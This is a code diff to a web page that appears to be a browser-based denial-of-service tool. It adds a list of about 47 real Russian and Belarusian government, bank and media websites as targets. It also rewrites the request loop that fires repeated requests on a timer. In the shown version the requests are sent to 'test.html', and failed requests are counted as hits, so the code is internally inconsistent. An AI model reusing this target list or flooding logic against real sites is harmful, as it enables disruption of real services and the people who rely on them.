@@ -64,7 +64,56 @@ height: 50px;
                     url: "https://cdn.ren.tv/asset/dist/client/ea1684f.js",
                     method: "GET",
                 },
+
+            {"url": "https://mil.ru", method: "GET"},
+            {"url": "http://www.scrf.gov.ru", method: "GET"},
+            {"url": "https://ach.gov.ru", method: "GET"},
+            {"url": "https://epp.genproc.gov.ru", method: "GET"},
+            {"url": "https://www.gosuslugi.ru", method: "GET"},
+            {"url": "http://kremlin.ru", method: "GET"},
+            {"url": "https://mid.ru", method: "GET"},
+            {"url": "https://www.1tv.ru", method: "GET"},
+            {"url": "https://pnp.ru", method: "GET"},
+            {"url": "https://fsb.ru", method: "GET"},
+            {"url": "https://www.rt.com/", method: "GET"},
+            {"url": "https://tass.ru", method: "GET"},
+            {"url": "https://vesti.ru", method: "GET"},
+            {"url": "https://yandex.ru", method: "GET"},
+            {"url": "https://iz.ru", method: "GET"},
+            {"url": "https://lenta.ru", method: "GET"},
+            {"url": "https://vgtrk.ru", method: "GET"},
+            {"url": "https://ria.ru", method: "GET"},
+            {"url": "https://rambler.ru", method: "GET"},
+            {"url": "https://gazeta.ru", method: "GET"},
+            {"url": "https://duma.gov.ru", method: "GET"},
+            {"url": "https://belta.by", method: "GET"},
+            {"url": "https://mk.ru", method: "GET"},
+            {"url": "https://gazprom.ru", method: "GET"},
+            {"url": "https://gazprombank.ru", method: "GET"},
+            {"url": "https://znak.com", method: "GET"},
+            {"url": "https://cbr.ru", method: "GET"},
+            {"url": "https://sberbank.ru", method: "GET"},
+            {"url": "https://vtb.ru", method: "GET"},
+            {"url": "https://rosbank.ru", method: "GET"},
+            {"url": "https://kp.ru", method: "GET"},
+            {"url": "https://karaulovlife.ru", method: "GET"},
+            {"url": "https://news-front.info/", method: "GET"},
+            {"url": "https://rusnext.ru/", method: "GET"},
+            {"url": "http://life.ru/", method: "GET"},
+            {"url": "https://www.mid-dnr.su/", method: "GET"},
+            {"url": "https://www.5-tv.ru/live/", method: "GET"},
+            {"url": "http://zvezda.ru/", method: "GET"},
+            {"url": "https://www.politnavigator.net/", method: "GET"},
+            {"url": "https://russian.rt.com/", method: "GET"},
+            {"url": "http://lt.sputniknews.ru/", method: "GET"},
+            {"url": "http://sputniknews.lt/", method: "GET"},
+            {"url": "https://sputnik-abkhazia.ru/", method: "GET"},
+            {"url": "http://francais.rt.com/", method: "GET"},
+            {"url": "https://novorosinform.org/", method: "GET"},
+            {"url": "https://ren.tv/", method: "GET"},
+            {"url": "http://tvzvezda.ru/", method: "GET"},
             ];
+            
 
         const btn = document.getElementById("btn");
         const countP = document.getElementById("count");
@@ -76,8 +125,6 @@ height: 50px;
 
         btn.addEventListener("click", () => {
             if (btn.innerText === "Start") {
-                //
-                //
                 textP.innerText = "Героям Слава!"
                 btn.innerText = "Stop";
                 start();
@@ -104,25 +151,19 @@ height: 50px;
             if(start_state && counter === 0){
                 var s = sites[Math.floor(Math.random() * sites.length)];
                 console.log("ites[s", sites, s)
-                if (s.method === "GET") {
-                    counter++;
-                    $.get(
-                        s.url, {}, function (data) {
-                            count_all++;
-                            countP.innerText = count_all+"";
-                            counter--;
-                        }
-                    );
-                } else {
-                    counter++;
-                    $.post(
-                        s.url, {}, function (data) {
-                            count_all++;
-                            countP.innerText = count_all + "";
-                            counter--;
-                        }
-                    );
-                }
+                $.ajax({
+                    url: "test.html",
+                    method: s.method,
+                    error: function () {
+                        count_all++;
+                        countP.innerText = count_all + "";
+                        counter--;
+                    },
+                    success: function () {
+                        counter--;
+                    },
+                    timeout: 3000
+                });
             }                  
         }, 1000)
         
